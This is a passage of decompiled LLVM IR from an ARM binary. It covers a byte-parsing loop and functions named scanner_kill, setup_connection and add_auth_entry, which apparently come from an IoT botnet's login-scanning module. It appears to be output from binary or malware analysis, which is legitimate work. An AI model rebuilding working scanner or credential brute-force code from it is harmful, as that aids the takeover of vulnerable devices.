  store i32 1, i32* %r0.global-to-local, align 4
  %v1_e98424 = inttoptr i32 %v1_e970 to i8*
  %v2_e98425 = load i8, i8* %v1_e98424, align 1
  %v3_e98426 = zext i8 %v2_e98425 to i32
  store i32 %v3_e98426, i32* %r2.global-to-local, align 4
  %v2_e98827 = icmp eq i8 %v2_e98425, 0
  store i1 %v2_e98827, i1* %cpsr_z.global-to-local, align 1
  %v3_e98c28 = mul nuw nsw i32 %v3_e98426, 256
  store i32 %v3_e98c28, i32* @r1, align 4
  br i1 %v2_e98827, label %dec_label_pc_e9c0, label %dec_label_pc_e994.preheader

dec_label_pc_e994.preheader:                      ; preds = %dec_label_pc_e978, %dec_label_pc_e984.backedge
  %v1_ea04 = phi i32 [ %v1_ea0465, %dec_label_pc_e984.backedge ], [ 1, %dec_label_pc_e978 ]
  %v0_e9fc63 = phi i32 [ %v0_e9fc, %dec_label_pc_e984.backedge ], [ 0, %dec_label_pc_e978 ]
  %v0_e9a061 = phi i32 [ %v3_e98c, %dec_label_pc_e984.backedge ], [ %v3_e98c28, %dec_label_pc_e978 ]
  %v0_e99c59 = phi i32 [ %v1_ea00, %dec_label_pc_e984.backedge ], [ %v1_e970, %dec_label_pc_e978 ]
  %v0_e99457 = phi i32 [ %v3_e984, %dec_label_pc_e984.backedge ], [ %v3_e98426, %dec_label_pc_e978 ]
  br label %dec_label_pc_e994

dec_label_pc_e994:                                ; preds = %dec_label_pc_e994.preheader, %dec_label_pc_e99c
  %v0_e9fc = phi i32 [ %v0_e9fc63, %dec_label_pc_e994.preheader ], [ 1, %dec_label_pc_e99c ]
  %v0_e9a0 = phi i32 [ %v0_e9a061, %dec_label_pc_e994.preheader ], [ %v3_e9b8, %dec_label_pc_e99c ]
  %v0_ea00 = phi i32 [ %v0_e99c59, %dec_label_pc_e994.preheader ], [ %v2_e9a8, %dec_label_pc_e99c ]
  %v0_e994 = phi i32 [ %v0_e99457, %dec_label_pc_e994.preheader ], [ %v3_e9ac, %dec_label_pc_e99c ]
  %v7_e994 = icmp eq i32 %v0_e994, 191
  store i1 %v7_e994, i1* %cpsr_z.global-to-local, align 1
  %tmp159 = icmp ult i32 %v0_e994, 192
  br i1 %tmp159, label %dec_label_pc_e9fc, label %dec_label_pc_e99c

dec_label_pc_e99c:                                ; preds = %dec_label_pc_e994
  %v1_e99c = add i32 %v0_ea00, 1
  %v2_e99c = inttoptr i32 %v1_e99c to i8*
  %v3_e99c = load i8, i8* %v2_e99c, align 1
  %v4_e99c = zext i8 %v3_e99c to i32
  %v2_e9a0 = or i32 %v4_e99c, -49152
  %v0_e9a8 = load i32, i32* @r5, align 4
  %v1_e9a4 = add i32 %v0_e9a8, %v0_e9a0
  %v2_e9a8 = add i32 %v1_e9a4, %v2_e9a0
  store i32 %v2_e9a8, i32* %r3.global-to-local, align 4
  %v1_e9ac = inttoptr i32 %v2_e9a8 to i8*
  %v2_e9ac = load i8, i8* %v1_e9ac, align 1
  %v3_e9ac = zext i8 %v2_e9ac to i32
  store i32 %v3_e9ac, i32* %r2.global-to-local, align 4
  %v2_e9b0 = icmp eq i8 %v2_e9ac, 0
  store i1 %v2_e9b0, i1* %cpsr_z.global-to-local, align 1
  store i32 1, i32* %ip.global-to-local, align 4
  %v3_e9b8 = mul nuw nsw i32 %v3_e9ac, 256
  store i32 %v3_e9b8, i32* @r1, align 4
  br i1 %v2_e9b0, label %dec_label_pc_e9c0, label %dec_label_pc_e994

dec_label_pc_e9c0:                                ; preds = %dec_label_pc_e984.backedge, %dec_label_pc_e99c, %dec_label_pc_e978
  %v1_e9c4 = phi i32 [ 1, %dec_label_pc_e978 ], [ %v1_ea04, %dec_label_pc_e99c ], [ %v1_ea0465, %dec_label_pc_e984.backedge ]
  %v0_e9c0 = phi i32 [ 0, %dec_label_pc_e978 ], [ 1, %dec_label_pc_e99c ], [ %v0_e9fc, %dec_label_pc_e984.backedge ]
  %v7_e9c0 = icmp eq i32 %v0_e9c0, 1
  store i1 %v7_e9c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e9c0, label %bb121, label %bb122

bb121:                                            ; preds = %dec_label_pc_e9c0
  %v2_e9c4 = add i32 %v1_e9c4, 1
  store i32 %v2_e9c4, i32* %r0.global-to-local, align 4
  br label %bb122

bb122:                                            ; preds = %dec_label_pc_ea20, %dec_label_pc_e9c0, %bb121
  %v1_e9c8 = phi i32 [ %v5_ea38, %dec_label_pc_ea20 ], [ %v1_e9c4, %dec_label_pc_e9c0 ], [ %v2_e9c4, %bb121 ]
  %v2_e9c8 = add i32 %v1_e9c8, %v1_e970
  br label %dec_label_pc_e8f8.backedge

dec_label_pc_e8f8.backedge:                       ; preds = %bb122, %dec_label_pc_ea44
  %v0_e8f8.pre = phi i32 [ %v3_e904144, %bb122 ], [ %v0_e8f8.pre.pre, %dec_label_pc_ea44 ]
  %storemerge29 = phi i32 [ %v2_e9c8, %bb122 ], [ %v2_eabc, %dec_label_pc_ea44 ]
  store i32 %storemerge29, i32* %r0.global-to-local, align 4
  %v1_e8f8 = add i32 %v0_e8f8.pre, -1
  %v3_e8fc = mul i32 %v1_e8f8, 65536
  store i32 %v3_e8fc, i32* %r3.global-to-local, align 4
  %v7_e900 = icmp eq i32 %v3_e8fc, -65536
  store i1 %v7_e900, i1* %cpsr_z.global-to-local, align 1
  %v3_e904 = urem i32 %v1_e8f8, 65536
  store i32 %v3_e904, i32* @r8, align 4
  br i1 %v7_e900, label %dec_label_pc_e880, label %dec_label_pc_e90c

dec_label_pc_e9d0:                                ; preds = %dec_label_pc_e880
  %v1_e9d0 = add i32 %v0_e888, 4
  %v2_e9d0 = inttoptr i32 %v1_e9d0 to i32*
  %v3_e9d0 = load i32, i32* %v2_e9d0, align 4
  store i32 %v3_e9d0, i32* %r0.global-to-local, align 4
  %v2_e9d4 = icmp eq i32 %v3_e9d0, 0
  store i1 %v2_e9d4, i1* %cpsr_z.global-to-local, align 1
  store i32 ptrtoint (i32* @global_var_e9dc.138 to i32), i32* @lr, align 4
  %v1_e9d8 = xor i1 %v2_e9d4, true
  call void @__pseudo_cond_branch(i1 %v1_e9d8, i32 ptrtoint (i32* @global_var_135cc.33 to i32))
  %v0_e9dc = load i32, i32* @fp, align 4
  store i32 %v0_e9dc, i32* @r0, align 4
  %v0_e9e0 = call i32 @free()
  store i32 %v0_e9e0, i32* %r0.global-to-local, align 4
  %v0_e9e4 = load i32, i32* @r4, align 4
  br label %dec_label_pc_e894

dec_label_pc_e9ec:                                ; preds = %dec_label_pc_e928
  %v2_e9ec = icmp eq i32 %v0_e9ec, 0
  store i1 %v2_e9ec, i1* %cpsr_z.global-to-local, align 1
  %v1_e9f0 = add i32 %v0_e9f0, 1
  store i32 %v1_e9f0, i32* %r3.global-to-local, align 4
  br i1 %v2_e9ec, label %bb123, label %dec_label_pc_e918.backedge

dec_label_pc_e918.backedge:                       ; preds = %dec_label_pc_e9ec, %bb123
  %v1_e9f450 = phi i32 [ %v1_e9f4, %dec_label_pc_e9ec ], [ %v2_e9f4, %bb123 ]
  %v1_e918 = inttoptr i32 %v1_e9f0 to i8*
  %v2_e918 = load i8, i8* %v1_e918, align 1
  %v3_e918 = zext i8 %v2_e918 to i32
  store i32 %v3_e918, i32* %r2.global-to-local, align 4
  %v2_e91c = icmp eq i8 %v2_e918, 0
  store i1 %v2_e91c, i1* %cpsr_z.global-to-local, align 1
  %v3_e920 = mul nuw nsw i32 %v3_e918, 256
  store i32 %v3_e920, i32* @r1, align 4
  br i1 %v2_e91c, label %dec_label_pc_e954, label %dec_label_pc_e928.preheader

bb123:                                            ; preds = %dec_label_pc_e9ec
  %v2_e9f4 = add i32 %v1_e9f4, 1
  store i32 %v2_e9f4, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_e918.backedge

dec_label_pc_e9fc:                                ; preds = %dec_label_pc_e994
  %v2_e9fc = icmp eq i32 %v0_e9fc, 0
  store i1 %v2_e9fc, i1* %cpsr_z.global-to-local, align 1
  %v1_ea00 = add i32 %v0_ea00, 1
  store i32 %v1_ea00, i32* %r3.global-to-local, align 4
  br i1 %v2_e9fc, label %bb124, label %dec_label_pc_e984.backedge

dec_label_pc_e984.backedge:                       ; preds = %dec_label_pc_e9fc, %bb124
  %v1_ea0465 = phi i32 [ %v1_ea04, %dec_label_pc_e9fc ], [ %v2_ea04, %bb124 ]
  %v1_e984 = inttoptr i32 %v1_ea00 to i8*
  %v2_e984 = load i8, i8* %v1_e984, align 1
  %v3_e984 = zext i8 %v2_e984 to i32
  store i32 %v3_e984, i32* %r2.global-to-local, align 4
  %v2_e988 = icmp eq i8 %v2_e984, 0
  store i1 %v2_e988, i1* %cpsr_z.global-to-local, align 1
  %v3_e98c = mul nuw nsw i32 %v3_e984, 256
  store i32 %v3_e98c, i32* @r1, align 4
  br i1 %v2_e988, label %dec_label_pc_e9c0, label %dec_label_pc_e994.preheader

bb124:                                            ; preds = %dec_label_pc_e9fc
  %v2_ea04 = add i32 %v1_ea04, 1
  store i32 %v2_ea04, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e984.backedge

dec_label_pc_ea0c:                                ; preds = %bb120
  %v1_ea0c = add i32 %v2_e95c, 2
  %v2_ea0c = inttoptr i32 %v1_ea0c to i8*
  %v3_ea0c = load i8, i8* %v2_ea0c, align 1
  %v4_ea0c = zext i8 %v3_ea0c to i32
  store i32 %v4_ea0c, i32* %r3.global-to-local, align 4
  %v1_ea10 = add i32 %v2_e95c, 3
  %v2_ea10 = inttoptr i32 %v1_ea10 to i8*
  %v3_ea10 = load i8, i8* %v2_ea10, align 1
  %v4_ea10 = zext i8 %v3_ea10 to i32
  store i32 %v4_ea10, i32* %r2.global-to-local, align 4
  %v4_ea14 = mul nuw nsw i32 %v4_ea10, 256
  %v5_ea14 = or i32 %v4_ea14, %v4_ea0c
  store i32 %v5_ea14, i32* %r3.global-to-local, align 4
  %v7_ea18 = icmp eq i32 %v5_ea14, 256
  store i1 %v7_ea18, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ea18, label %dec_label_pc_ea20, label %dec_label_pc_e978

dec_label_pc_ea20:                                ; preds = %dec_label_pc_ea0c
  %v1_ea20 = add i32 %v2_e95c, 9
  %v2_ea20 = inttoptr i32 %v1_ea20 to i8*
  %v3_ea20 = load i8, i8* %v2_ea20, align 1
  %v4_ea20 = zext i8 %v3_ea20 to i32
  store i32 %v4_ea20, i32* %r2.global-to-local, align 4
  %v1_ea24 = add i32 %v2_e95c, 8
  %v2_ea24 = inttoptr i32 %v1_ea24 to i8*
  %v3_ea24 = load i8, i8* %v2_ea24, align 1
  %v4_ea24 = zext i8 %v3_ea24 to i32
  %v4_ea28 = mul nuw nsw i32 %v4_ea20, 256
  %v5_ea28 = or i32 %v4_ea24, %v4_ea28
  %v3_ea2c = mul i32 %v5_ea28, 65536
  store i32 %v3_ea2c, i32* %r3.global-to-local, align 4
  %v3_ea30 = mul nuw nsw i32 %v4_ea24, 256
  store i32 %v3_ea30, i32* %r2.global-to-local, align 4
  %v5_ea38 = or i32 %v3_ea30, %v4_ea20
  store i32 %v5_ea38, i32* %r0.global-to-local, align 4
  %v7_ea3c = icmp eq i32 %v5_ea38, 4
  store i1 %v7_ea3c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ea3c, label %dec_label_pc_ea44, label %bb122

dec_label_pc_ea44:                                ; preds = %dec_label_pc_ea20
  %v2_ea44 = inttoptr i32 %v1_e970 to i8*
  %v3_ea44 = load i8, i8* %v2_ea44, align 1
  %v4_ea44 = zext i8 %v3_ea44 to i32
  store i32 %v4_ea44, i32* %r3.global-to-local, align 4
  store i32 %v2_e654, i32* %r2.global-to-local, align 4
  %v1_ea50 = add i32 %v2_e95c, 11
  %v2_ea50 = inttoptr i32 %v1_ea50 to i8*
  %v3_ea50 = load i8, i8* %v2_ea50, align 1
  %v4_ea50 = zext i8 %v3_ea50 to i32
  store i32 %v4_ea50, i32* %r2.global-to-local, align 4
  store i32 %v2_e654, i32* %r3.global-to-local, align 4
  %v1_ea5c = add i32 %v2_e95c, 12
  %v2_ea5c = inttoptr i32 %v1_ea5c to i8*
  %v3_ea5c = load i8, i8* %v2_ea5c, align 1
  %v4_ea5c = zext i8 %v3_ea5c to i32
  store i32 %v4_ea5c, i32* %r3.global-to-local, align 4
  store i32 %v2_e654, i32* %ip.global-to-local, align 4
  %v1_ea68 = add i32 %v2_e95c, 13
  %v2_ea68 = inttoptr i32 %v1_ea68 to i8*
  %v3_ea68 = load i8, i8* %v2_ea68, align 1
  %v4_ea68 = zext i8 %v3_ea68 to i32
  store i32 %v4_ea68, i32* %r2.global-to-local, align 4
  %v0_ea70 = load i32, i32* @fp, align 4
  %v1_ea70 = inttoptr i32 %v0_ea70 to i8*
  %v2_ea70 = load i8, i8* %v1_ea70, align 1
  %v3_ea70 = zext i8 %v2_ea70 to i32
  %v1_ea74 = mul nuw nsw i32 %v3_ea70, 4
  %v3_ea78 = add nuw nsw i32 %v1_ea74, 4
  store i32 %v3_ea78, i32* %r1.global-to-local, align 4
  %v1_ea7c = add i32 %v0_ea70, 4
  %v2_ea7c = inttoptr i32 %v1_ea7c to i32*
  %v3_ea7c = load i32, i32* %v2_ea7c, align 4
  store i32 %v3_ea7c, i32* %r0.global-to-local, align 4
  %v3_ea80 = sext i8 %v3_ea68 to i32
  %v5_ea80 = sext i8 %v3_ea5c to i32
  %v10_ea80 = inttoptr i32 %v3_ea7c to i32*
  %v11_ea80 = call i32 @realloc(i32* %v10_ea80, i32 %v3_ea78, i32 %v3_ea80, i32 %v5_ea80)
  store i32 %v11_ea80, i32* %r0.global-to-local, align 4
  %v0_ea84 = load i32, i32* @fp, align 4
  %v1_ea84 = inttoptr i32 %v0_ea84 to i8*
  %v2_ea84 = load i8, i8* %v1_ea84, align 1
  %v3_ea84 = zext i8 %v2_ea84 to i32
  store i32 %v3_ea84, i32* %r2.global-to-local, align 4
  store i32 %v2_e654, i32* @lr, align 4
  %v4_ea8c = sext i8 %v3_ea44 to i32
  store i32 %v4_ea8c, i32* %r3.global-to-local, align 4
  %v1_ea90 = add nuw nsw i32 %v3_ea84, 1
  store i32 %v1_ea90, i32* @r1, align 4
  %v5_ea94 = mul nuw nsw i32 %v3_ea84, 4
  %v6_ea94 = add i32 %v5_ea94, %v11_ea80
  %v7_ea94 = inttoptr i32 %v6_ea94 to i32*
  store i32 %v4_ea8c, i32* %v7_ea94, align 4
  %v1_ea98 = load i32, i32* @fp, align 4
  %v2_ea98 = add i32 %v1_ea98, 4
  %v3_ea98 = inttoptr i32 %v2_ea98 to i32*
  store i32 %v11_ea80, i32* %v3_ea98, align 4
  %v0_ea9c = load i32, i32* @r1, align 4
  %v1_ea9c = trunc i32 %v0_ea9c to i8
  %v2_ea9c = load i32, i32* @fp, align 4
  %v3_ea9c = inttoptr i32 %v2_ea9c to i8*
  store i8 %v1_ea9c, i8* %v3_ea9c, align 1
  %v0_eaa0 = load i32, i32* @r4, align 4
  %v1_eaa0 = add i32 %v0_eaa0, 9
  %v2_eaa0 = inttoptr i32 %v1_eaa0 to i8*
  %v3_eaa0 = load i8, i8* %v2_eaa0, align 1
  %v4_eaa0 = zext i8 %v3_eaa0 to i32
  store i32 %v4_eaa0, i32* %r3.global-to-local, align 4
  %v1_eaa4 = add i32 %v0_eaa0, 8
  %v2_eaa4 = inttoptr i32 %v1_eaa4 to i8*
  %v3_eaa4 = load i8, i8* %v2_eaa4, align 1
  %v4_eaa4 = zext i8 %v3_eaa4 to i32
  %v4_eaa8 = mul nuw nsw i32 %v4_eaa0, 256
  %v5_eaa8 = or i32 %v4_eaa4, %v4_eaa8
  %v3_eaac = mul i32 %v5_eaa8, 65536
  store i32 %v3_eaac, i32* %r2.global-to-local, align 4
  %v3_eab0 = mul nuw nsw i32 %v4_eaa4, 256
  store i32 %v3_eab0, i32* %r3.global-to-local, align 4
  %v5_eab8 = or i32 %v3_eab0, %v4_eaa0
  store i32 %v5_eab8, i32* %r0.global-to-local, align 4
  %v0_eabc = load i32, i32* @r7, align 4
  %v2_eabc = add i32 %v0_eabc, %v5_eab8
  %v0_e8f8.pre.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_e8f8.backedge

; uselistorder directives
  uselistorder i32 %v3_eab0, { 1, 0 }
  uselistorder i32 %v4_eaa0, { 1, 0, 2 }
  uselistorder i32 %v11_ea80, { 1, 0, 2 }
  uselistorder i32 %v3_ea78, { 1, 0 }
  uselistorder i32 %v5_ea38, { 1, 2, 0 }
  uselistorder i32 %v3_ea30, { 1, 0 }
  uselistorder i32 %v4_ea20, { 1, 0, 2 }
  uselistorder i32 %v2_ea04, { 1, 0 }
  uselistorder i32 %v3_e984, { 0, 2, 1 }
  uselistorder i32 %v1_ea0465, { 1, 0 }
  uselistorder i32 %v1_ea00, { 1, 2, 0 }
  uselistorder i32 %v2_e9f4, { 1, 0 }
  uselistorder i32 %v3_e918, { 0, 2, 1 }
  uselistorder i32 %v1_e9f450, { 1, 0 }
  uselistorder i32 %v1_e9f0, { 1, 2, 0 }
  uselistorder i1 %v7_e900, { 1, 0 }
  uselistorder i32 %v1_e8f8, { 1, 0 }
  uselistorder i32 %storemerge29, { 1, 0 }
  uselistorder i32 %v3_e9ac, { 0, 2, 1 }
  uselistorder i32 %v2_e9a8, { 1, 2, 0 }
  uselistorder i32 %v0_e9fc, { 2, 0, 1 }
  uselistorder i32 %v1_ea04, { 1, 2, 0 }
  uselistorder i32 %v3_e98c28, { 1, 0 }
  uselistorder i32 %v3_e98426, { 1, 0, 2 }
  uselistorder i32 %v1_e970, { 2, 1, 0, 4, 3, 5 }
  uselistorder i32 %v2_e95c, { 0, 1, 2, 4, 3, 6, 5, 7, 9, 8, 10 }
  uselistorder i32 %v3_e940, { 0, 2, 1 }
  uselistorder i32 %v2_e93c, { 1, 2, 0 }
  uselistorder i32 %v0_e9ec, { 2, 0, 1 }
  uselistorder i32 %v1_e9f4, { 1, 2, 0 }
  uselistorder i32 %v3_e92022, { 1, 0 }
  uselistorder i32 %v3_e91820, { 1, 0, 2 }
  uselistorder i32 %v0_e95c143, { 3, 0, 1, 2 }
  uselistorder i32 %v3_e904142, { 1, 0 }
  uselistorder i1 %v7_e900141, { 1, 0 }
  uselistorder i32 %v1_e8f8134, { 1, 0 }
  uselistorder i1 %v9_e8d4, { 1, 0 }
  uselistorder i32 %v0_e894, { 1, 0 }
  uselistorder i32 %v0_e888, { 1, 0, 2 }
  uselistorder i32 %v0_e878, { 1, 0 }
  uselistorder i32 %v0_e850, { 1, 0 }
  uselistorder i32 %v1_e804, { 1, 0, 2 }
  uselistorder i1 %v7_e7fc, { 1, 0 }
  uselistorder i32 %v5_e7f8, { 1, 0, 2 }
  uselistorder i32 %v1_e7c0, { 1, 0 }
  uselistorder i32 %v3_e7ac, { 1, 0 }
  uselistorder i32 %v0_e7a4, { 1, 0 }
  uselistorder i32 %v1_e798, { 1, 2, 0 }
  uselistorder i1 %v7_e750, { 1, 0 }
  uselistorder i32 %v4_e74c, { 1, 0, 2 }
  uselistorder i1 %v7_e734, { 1, 0 }
  uselistorder i32 %v3_e730, { 1, 0, 2 }
  uselistorder i1 %v7_e718, { 1, 0 }
  uselistorder i32 %v3_e714, { 2, 1, 0, 3 }
  uselistorder i1 %v7_e6fc, { 2, 1, 0 }
  uselistorder i32 %v1_e700, { 1, 0 }
  uselistorder i32 %v2_e7b0, { 1, 0 }
  uselistorder i32 %v2_e788, { 1, 0, 2 }
  uselistorder i16 %v5_e6a4, { 1, 0 }
  uselistorder i32 %v2_e6a0, { 1, 0, 2 }
  uselistorder i32 %v6_e68c, { 1, 2, 0 }
  uselistorder i64 %v5_e688, { 0, 2, 1 }
  uselistorder i32 %v1_e674, { 1, 0, 2 }
  uselistorder i32 %v1_e62c, { 1, 0 }
  uselistorder i32 %v1_e628, { 1, 2, 0 }
  uselistorder i32 %v2_e624, { 1, 0 }
  uselistorder i1 %v8_e610, { 1, 0 }
  uselistorder i32 %v2_e5e8, { 1, 0, 2 }
  uselistorder i16* %stack_var_-2244, { 1, 0 }
  uselistorder i32* %stack_var_-68, { 0, 2, 1 }
  uselistorder i16* %stack_var_-4292, { 1, 0 }
  uselistorder i16 %tmp79, { 0, 2, 1 }
  uselistorder i32* %r6.global-to-local, { 0, 4, 1, 3, 2 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 17, 12, 15, 13, 14, 16, 18, 37, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 36, 34, 35, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 11, 14, 10, 1, 12, 13, 0, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 12, 11, 13, 10 }
  uselistorder i32* %r0.global-to-local, { 1, 5, 2, 3, 4, 11, 6, 8, 7, 9, 10, 12, 15, 13, 14, 17, 16, 20, 18, 19, 21, 22, 24, 23, 26, 25, 27, 29, 28, 30, 33, 32, 31, 34, 35, 36, 37, 38, 39, 40, 41, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 3, 4, 11, 5, 16, 6, 7, 17, 8, 9, 10, 1, 12, 13, 14, 15, 0, 37, 18, 19, 20, 21, 22, 23, 24, 25, 26, 36, 27, 28, 29, 30, 35, 32, 33, 31, 34, 2 }
  uselistorder i32 (i32)* @sleep, { 11, 10, 9, 8, 7, 5, 6, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_e984.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_e918.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_e8f8.backedge, { 1, 0 }
  uselistorder label %bb122, { 0, 2, 1 }
  uselistorder label %dec_label_pc_e994, { 1, 0 }
  uselistorder label %dec_label_pc_e994.preheader, { 1, 0 }
  uselistorder label %bb120, { 1, 0 }
  uselistorder label %dec_label_pc_e928, { 1, 0 }
  uselistorder label %dec_label_pc_e928.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_e90c, { 1, 0 }
  uselistorder label %dec_label_pc_e894, { 1, 0 }
  uselistorder label %dec_label_pc_e880, { 5, 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_e860, { 2, 1, 4, 0, 3 }
  uselistorder label %bb118, { 1, 0 }
  uselistorder label %bb115, { 2, 0, 1 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_e608, { 1, 0 }
}

define i32 @scanner_kill(i32 %arg1) local_unnamed_addr {
entry:
  %v2_ead0 = load i32, i32* @global_var_24fa4.140, align 4
  %v2_ead8 = call i32 @kill(i32 %v2_ead0, i32 9)
  ret i32 %v2_ead8

; uselistorder directives
  uselistorder i32 (i32, i32)* @kill, { 7, 6, 5, 4, 3, 2, 1, 0 }
}

define i32 @setup_connection() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_eaec = load i32, i32* @r4, align 4
  store i32 %v3_eaec, i32* %stack_var_-16, align 4
  %v6_eaec = load i32, i32* @r5, align 4
  %v9_eaec = load i32, i32* @r6, align 4
  %v12_eaec = load i32, i32* @lr, align 4
  %v0_eaf0 = load i32, i32* @r0, align 4
  store i32 %v0_eaf0, i32* @r5, align 4
  %v1_eaf4 = add i32 %v0_eaf0, 4
  %v2_eaf4 = inttoptr i32 %v1_eaf4 to i32*
  %v3_eaf4 = load i32, i32* %v2_eaf4, align 4
  store i32 %v3_eaf4, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  store i32 0, i32* %stack_var_-32, align 4
  store i32 60184, i32* @lr, align 4
  %v1_eb14 = icmp ne i32 %v3_eaf4, -1
  call void @__pseudo_cond_branch(i1 %v1_eb14, i32 ptrtoint (i32* @global_var_14aa0.112 to i32))
  store i32 2, i32* %r0.global-to-local, align 4
  %v0_eb20 = load i32, i32* @r6, align 4
  store i32 %v0_eb20, i32* %r2.global-to-local, align 4
  %v3_eb24 = call i32 @socket(i32 2, i32 1, i32 %v0_eb20)
  store i32 %v3_eb24, i32* %r0.global-to-local, align 4
  %v7_eb28 = icmp eq i32 %v3_eb24, -1
  %v1_eb2c = load i32, i32* @r5, align 4
  %v2_eb2c = add i32 %v1_eb2c, 4
  %v3_eb2c = inttoptr i32 %v2_eb2c to i32*
  store i32 %v3_eb24, i32* %v3_eb2c, align 4
  br i1 %v7_eb28, label %entry.dec_label_pc_eba4_crit_edge, label %dec_label_pc_eb34

entry.dec_label_pc_eba4_crit_edge:                ; preds = %entry
  %v1_ebac.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_eba4

dec_label_pc_eb34:                                ; preds = %entry
  %v2_eaf8 = ptrtoint i32* %stack_var_-32 to i32
  %v0_eb34 = load i32, i32* @r5, align 4
  %v1_eb34 = add i32 %v0_eb34, 28
  store i32 %v1_eb34, i32* @r0, align 4
  %v0_eb38 = load i32, i32* @r6, align 4
  %v2_eb38 = add i32 %v0_eb34, 24
  %v3_eb38 = inttoptr i32 %v2_eb38 to i32*
  store i32 %v0_eb38, i32* %v3_eb38, align 4
  store i32 356, i32* @r1, align 4
  %v0_eb40 = call i32 @util_zero()
  store i32 %v0_eb40, i32* %r0.global-to-local, align 4
  %v0_eb44 = load i32, i32* @r5, align 4
  %v1_eb44 = add i32 %v0_eb44, 4
  %v2_eb44 = inttoptr i32 %v1_eb44 to i32*
  %v3_eb44 = load i32, i32* %v2_eb44, align 4
  store i32 %v3_eb44, i32* @r4, align 4
  %v0_eb48 = load i32, i32* @r6, align 4
  store i32 %v0_eb48, i32* @r2, align 4
  store i32 %v3_eb44, i32* %r0.global-to-local, align 4
  %v2_eb54 = call i32 @__libc_fcntl(i32 %v3_eb44, i32 3)
  %v1_eb5c = or i32 %v2_eb54, 2048
  store i32 %v1_eb5c, i32* @r2, align 4
  %v0_eb60 = load i32, i32* @r4, align 4
  store i32 %v0_eb60, i32* %r0.global-to-local, align 4
  %v2_eb64 = call i32 @__libc_fcntl(i32 %v0_eb60, i32 4)
  store i32 %v2_eb64, i32* %r0.global-to-local, align 4
  %v2_eb6c = load i32, i32* @global_var_224b8.142, align 4
  store i32 %v2_eb6c, i32* %r2.global-to-local, align 4
  %v1_eb74 = load i32, i32* @r5, align 4
  %v2_eb74 = add i32 %v1_eb74, 12
  %v3_eb74 = inttoptr i32 %v2_eb74 to i32*
  store i32 1, i32* %v3_eb74, align 4
  store i32 2, i32* %stack_var_-32, align 4
  %v0_eb80 = load i32, i32* %r2.global-to-local, align 4
  %v1_eb80 = load i32, i32* @r5, align 4
  %v2_eb80 = add i32 %v1_eb80, 8
  %v3_eb80 = inttoptr i32 %v2_eb80 to i32*
  store i32 %v0_eb80, i32* %v3_eb80, align 4
  %v0_eb84 = load i32, i32* @r5, align 4
  %v1_eb88 = add i32 %v0_eb84, 4
  %v2_eb88 = inttoptr i32 %v1_eb88 to i32*
  %v3_eb88 = load i32, i32* %v2_eb88, align 4
  store i32 %v3_eb88, i32* %r0.global-to-local, align 4
  %v1_eb8c = add i32 %v0_eb84, 20
  %v2_eb8c = inttoptr i32 %v1_eb8c to i16*
  %v3_eb8c = load i16, i16* %v2_eb8c, align 2
  %v4_eb8c = zext i16 %v3_eb8c to i32
  store i32 %v4_eb8c, i32* @r5, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_eba0 = call i32 @__libc_connect(i32 %v3_eb88, i32 %v2_eaf8, i32 16)
  store i32 %v3_eba0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_eba4

dec_label_pc_eba4:                                ; preds = %entry.dec_label_pc_eba4_crit_edge, %dec_label_pc_eb34
  %v1_ebac = phi i32 [ %v1_ebac.pre, %entry.dec_label_pc_eba4_crit_edge ], [ %v3_eba0, %dec_label_pc_eb34 ]
  %v2_eba8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_eba8, i32* @r4, align 4
  store i32 %v6_eaec, i32* @r5, align 4
  store i32 %v9_eaec, i32* @r6, align 4
  store i32 %v12_eaec, i32* @lr, align 4
  ret i32 %v1_ebac

; uselistorder directives
  uselistorder i32 %v3_eb24, { 1, 0, 2 }
  uselistorder i32* %stack_var_-32, { 0, 2, 1 }
  uselistorder i32* %r0.global-to-local, { 1, 0, 3, 2, 4, 5, 8, 9, 7, 6 }
  uselistorder i32 ()* @util_zero, { 0, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_eba4, { 1, 0 }
}

define i32 @add_auth_entry(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v3_ebb4 = load i32, i32* @r4, align 4
  %v6_ebb4 = load i32, i32* @r5, align 4
  %v9_ebb4 = load i32, i32* @r6, align 4
  %v12_ebb4 = load i32, i32* @r7, align 4
  %v15_ebb4 = load i32, i32* @r8, align 4
